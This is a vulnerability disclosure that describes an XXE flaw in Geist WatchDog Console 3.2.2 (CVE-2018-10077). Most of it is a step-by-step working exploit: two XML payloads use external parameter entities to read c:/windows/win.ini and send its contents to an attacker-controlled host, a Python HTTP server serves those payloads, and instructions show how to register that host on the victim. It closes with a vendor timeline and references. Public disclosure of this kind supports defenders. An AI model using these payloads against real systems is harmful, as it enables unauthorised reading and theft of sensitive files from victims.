# Vulnerability
With authenticated admin access to Geist WatchDog Console 3.2.2 or local access to the system, a user has the ability to read 
system files remotely through XXE

# Exploit
On attacking machine
- Create data.xml with following contents in apache root and start apache listening on 80
	<?xml version="1.0" encoding="utf-8"?>
	<!DOCTYPE r [
	<!ELEMENT r ANY >
	<!ENTITY % sp SYSTEM "http://192.168.0.149:8080/evil.xml">
	%sp;
	%param1;
	]>
	<r>&exfil;</r>

- Create evil.xml with the following contents anywhere
	<?xml version="1.0" encoding="UTF-8"?>
	<!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
	<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://192.168.0.149:8080/?%data;'>">
	
- Start python simple http server in same directory as evil.xml, listening on 8080
	python -m SimpleHTTPServer 8080
	
On victim machine (1 of 2 ways)
1. With admin access to application console, add attacking server IP address under servers tab
or
2. With local access to system
	- update 'C:\ProgramData\WatchDog Console\servers.xml file' with following:
		<?xml version="1.0" encoding="utf-8" standalone="yes"?>
		<servers>
		<server host="192.168.0.149" addrType="http" port="80" description="" selEmail="True" Username="1" Password="1" left="700" top="420" />
		</servers>
	- restart system

On attacking machine
- Contents of 'win.ini' is outputted to console
- evil.xml can be updated to read other sensitive files (tested reading file from admin desktop)

# Timeline
04-14-18: Vendor notified of vulnerabilities
<br>04-16-18: Vendor responded "Thank you for bringing this to our attention. The product has now been End-of-life for several years and is no longer receiving updates."
<br>04-17-18: Submitted public disclosure

# Reference
[EDB-ID: 44493](https://www.exploit-db.com/exploits/44493/)
<br>[MITRE CVE-2018-10077](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10077)

# Disclaimer
Content is for educational and research purposes only. Author doesnâ€™t hold any responsibility over the misuse of the software, exploits or security findings contained herein and does not condone them whatsoever.
